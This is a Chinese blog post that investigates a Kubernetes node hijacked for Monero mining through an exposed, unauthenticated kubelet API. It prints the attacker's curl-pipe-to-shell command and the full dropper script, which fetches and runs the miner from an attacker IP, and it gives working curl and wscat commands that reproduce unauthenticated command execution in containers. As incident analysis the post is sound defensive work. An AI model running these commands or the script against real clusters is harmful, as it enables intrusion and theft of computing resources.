---
layout: default
title:  Kubernetes集群节点被入侵挖矿，CPU被占满
author: 李佶澳
createdate: 2018/07/20 19:38:00
changedate: 2018/07/22 15:11:22
categories: 问题
tags: kubernetes
keywords: kubernetes,挖矿,入侵,kubelet漏洞个
description: kubelet漏洞导致不需要任何认证就可以到容器中执行命令，通过这种方式可以在任意一个容器中安装恶意程序。

---

## 目录
* auto-gen TOC:
{:toc}

## 现象

一个Kubernetes节点的CPU占用突然100%：

	top - 19:43:23 up 8 days, 22:32,  2 users,  load average: 33.38, 34.45, 34.35
	Tasks: 354 total,   3 running, 351 sleeping,   0 stopped,   0 zombie
	%Cpu(s): 97.7 us,  2.0 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.3 st
	KiB Mem :  7877736 total,  3239448 free,   869516 used,  3768772 buff/cache
	KiB Swap:  1048572 total,  1048572 free,        0 used.  5867656 avail Mem

	  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
	16654 root      20   0 1513200  36612    512 S 781.8  0.5   1624:08 docker
	16210 root      20   0 1513200  41752    500 S 709.6  0.5   1674:52 docker
	 9381 root      20   0 1513200  39448    504 S  49.3  0.5   6234:25 docker
	17550 root      20   0 1513200  37432    416 R   9.9  0.5  21:22.77 docker

是下面的几个进程在捣鬼，很奇怪：

	root     16210     1 99 16:01 ?        1-03:56:41 /tmp/docker -c /tmp/k.conf
	root     16654     1 99 16:03 ?        1-03:05:50 /tmp/docker -c /tmp/k.conf
	root     17550     1  9 16:07 ?        00:21:24 /tmp/docker -c /tmp/k.conf

## 调查

Github上有人提出这个问题 ["/tmp/docker -c /tmp/k.conf process use 100% CPU"][1]：

	This is an issue with an insecure deployment of kubernetes. Make sure there is 
	no public access to the kubelet api. If port 10250 is exposed to the public on 
	any nodes, then malicious processes will be able to execute commands in pods 
	running on these nodes. I've noticed the same issue recently until public access was removed.
	
	There is a good blog post here on Medium explaining the ramifications of this.

顺藤摸瓜找到这篇文章：[Analysis of a Kubernetes hack — Backdooring through kubelet][2]

到这个进程下面发现，/tmp/docker被删除了，可能是恶意程序，启动后毁尸灭迹：

	[root@proxy-67 16210]# ls -lh
	total 0
	dr-xr-xr-x  2 root root 0 Jul 20 19:19 attr
	-rw-r--r--  1 root root 0 Jul 20 19:55 autogroup
	-r--------  1 root root 0 Jul 20 19:55 auxv
	-r--r--r--  1 root root 0 Jul 20 19:55 cgroup
	--w-------  1 root root 0 Jul 20 19:55 clear_refs
	-r--r--r--  1 root root 0 Jul 20 19:05 cmdline
	-rw-r--r--  1 root root 0 Jul 20 19:55 comm
	-rw-r--r--  1 root root 0 Jul 20 19:55 coredump_filter
	-r--r--r--  1 root root 0 Jul 20 19:55 cpuset
	lrwxrwxrwx  1 root root 0 Jul 20 19:55 cwd -> /
	-r--------  1 root root 0 Jul 20 19:55 environ
	lrwxrwxrwx  1 root root 0 Jul 20 19:29 exe -> /tmp/docker (deleted)
	dr-x------  2 root root 0 Jul 20 19:19 fd

将进程内存dump：

	$ pmap -X 16210
	16210:   /tmp/docker -c /tmp/k.conf
			 Address Perm   Offset Device    Inode    Size   Rss   Pss Referenced Anonymous Swap Locked Mapping
			00400000 r-xp 00000000  fc:0a 25165962    2268   756   756        756         0    0      0 docker (deleted)
			00836000 rw-p 00236000  fc:0a 25165962      32    32    32         32        12    0      0 docker (deleted)
			0083e000 rw-p 00000000  00:00        0      36    20    20         20        20    0      0
			02571000 rw-p 00000000  00:00        0     212   144   144        144       144    0      0 [heap]
			025a6000 rw-p 00000000  00:00        0    1048   932   932        932       932    0      0 [heap]
		7f3c04000000 rw-p 00000000  00:00        0     132     8     8          8         8    0      0
		7f3c04021000 ---p 00000000  00:00        0   65404     0     0          0         0    0      0

	$ gdb --pid 16210
	$ (gdb) dump memory /tmp/heap2-1048.dat 0x025a6000 0x026ac000

在堆中发现了一些字符：

	miner.fee.xmrig.com
	emergency.fee.xmrig.com
	miner.fee.xmrig.

域名www.xmrig.com被重定向了到[Monero][4]矿机到github主页：

	$ curl -v  www.xmrig.com
	* Rebuilt URL to: www.xmrig.com/
	*   Trying 104.27.129.76...
	* TCP_NODELAY set
	* Connected to www.xmrig.com (104.27.129.76) port 80 (#0)
	> GET / HTTP/1.1
	> Host: www.xmrig.com
	> User-Agent: curl/7.54.0
	> Accept: */*
	>
	< HTTP/1.1 302 Moved Temporarily
	< Date: Fri, 20 Jul 2018 12:44:41 GMT
	< Transfer-Encoding: chunked
	< Connection: keep-alive
	< Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0
	< Expires: Thu, 01 Jan 1970 00:00:01 GMT
	< Location: https://github.com/xmrig/xmrig
	< Server: cloudflare
	< CF-RAY: 43d58545d57c98ef-LAX
	<
	* Connection #0 to host www.xmrig.com left intact

## 入侵路径分析

查看下进程启动时间，一个是7月12号的（运行一周了..），另外三个是下午4点的。

	# ps  -eo  pid,lstart,cmd,args  |grep k.conf
	 9381 Thu Jul 12 00:02:50 2018 /tmp/docker -c /tmp/k.conf  /tmp/docker -c /tmp/k.conf
	16210 Fri Jul 20 16:01:51 2018 /tmp/docker -c /tmp/k.conf  /tmp/docker -c /tmp/k.conf
	16654 Fri Jul 20 16:03:13 2018 /tmp/docker -c /tmp/k.conf  /tmp/docker -c /tmp/k.conf
	17550 Fri Jul 20 16:07:03 2018 /tmp/docker -c /tmp/k.conf  /tmp/docker -c /tmp/k.conf

检查kubelet日志，发现有一条比较奇怪：

	Jul 20 16:03:04 proxy-67 kubelet[2108]: INFO:0720 16:03:04.807109    2108 server.go:794] GET /exec/kube-system/kubectl-k12l8/service-proxy?command=/bin/sh&command=-c&command=curl+82.146.53.166/x.sh+|+sh&input=1&output=1&tty=1: (6.226937ms) 302 [[Go-http-client/1.1] 92.63.106.91:54078]

日志显示拉取并执行了一个脚本：

	curl 82.146.53.166/x.sh|sh &input=1&output=1&tty=1:

将脚本的内容拿下来查看，`curl 82.146.53.166/x.sh` ：

	#!/bin/sh
	pkill -f cryptonight
	pkill -f sustes
	pkill -f xmrig
	pkill -f xmr-stak
	pkill -f suppoie
	pkill -f zer0day.ru
	
	WGET="wget -O"
	if [ -s /usr/bin/curl ];
	        then WGET="curl -o";
	fi;
	if [ -s /usr/bin/wget ];
	        then WGET="wget -O";
	fi
	if [ ! "$(ps -fe|grep '/tmp/docker -c /tmp/k.conf' |grep -v grep)" ]; then
	        f1=$(curl 82.146.53.166/g.php)
	        if [ -z "$f1" ];
	                then f1=$(wget -q -O - 82.146.53.166/g.php)
	        fi
	
	        f2="82.146.53.166"
	        if [ `getconf LONG_BIT` = "64" ]
	                then
	                $WGET /tmp/docker http://$f1/xmrig_64?$RANDOM
	        else
	                $WGET /tmp/docker http://$f1/xmrig_32?$RANDOM
	        fi
	
	        chmod +x /tmp/docker
	        $WGET /tmp/k.conf http://$f2/k.conf
	        nohup /tmp/docker -c /tmp/k.conf>/dev/null 2>&1 &
	        sleep 5
	        rm -rf /tmp/k.conf
	        rm -f /tmp/docker
	fi
	pkill -f logo9.jpg
	crontab -l | sed '/logo9/d' | crontab -

确定就是[Analysis of a Kubernetes hack — Backdooring through kubelet][2]中所说的问题了。

用telnet探测了下，中招机器的10250端口和10255端口被暴露出去了，绑了公网IP的缘故。。。

## 复现

用curl直接连接kublet的10250端口

	curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://kube-node-here:10250/exec/<namespace>/<podname>/<container-name>?command=touch&command=hello_world&input=1&output=1&tty=1"

将POST内容替换为对应的空间和名称，从返回结果中得到websocket地址：

	$ curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://10.39.1.67:10250/exec/kube-system/calico-node-5z4zh/calico-node?command=touch&command=/tmp/hello_world&input=1&output=1&tty=1"
	...
	< HTTP/2 302
	< location: /cri/exec/PfWkLulG
	< content-type: text/plain; charset=utf-8
	< content-length: 0
	< date: Tue, 13 Mar 2018 19:21:00 GMT
	...

然后用wscat直接连接：

	$ npm install -g wscat
	$ wscat -c "https://10.39.1.67:10250/cri/exec/PfWkLulG" --no-check                                                                                                                     
	connected (press CTRL+C to quit)
	<
	<
	disconnected

到目标容器查看，发现hello_world文件被创建。

在尝试一下下载文件：

	$ curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://10.39.1.67:10250/exec/kube-system/calico-node-5z4zh/calico-node?command=/bin/sh&command=-c&command=wget+www.baidu.com&input=1&output=1&tty=1"
	...
	< Location: /cri/exec/gkIeqSUP
	...
	
	$ wscat -c "https://10.39.1.67:10250/cri/exec/gkIeqSUP" --no-check
	connected (press CTRL+C to quit)
	<
	<
	< Connecting to www.baidu.com (61.135.169.125:80)
	index.html           100% |*******************************|  2381   0:00:00 ETA

	disconnected (code: 1000)

可以看到，kubelet漏洞导致不需要任何认证就可以到容器中执行命令，通过这种方式可以在任意一个容器中安装恶意程序。

## 参考

1. ["/tmp/docker -c /tmp/k.conf process use 100% CPU"][1]
2. [Analysis of a Kubernetes hack — Backdooring through kubelet][2]
3. [Dump a linux process's memory to file][3]
4. [XMRig is a high performance Monero (XMR) CPU miner][4]

[1]: https://github.com/docker/for-linux/issues/324  "/tmp/docker -c /tmp/k.conf process use 100% CPU"
[2]: https://medium.com/handy-tech/analysis-of-a-kubernetes-hack-backdooring-through-kubelet-823be5c3d67c  "Analysis of a Kubernetes hack — Backdooring through kubelet" 
[3]: https://serverfault.com/questions/173999/dump-a-linux-processs-memory-to-file "Dump a linux process's memory to file"
[4]: https://github.com/xmrig/xmrig "XMRig is a high performance Monero (XMR) CPU miner"
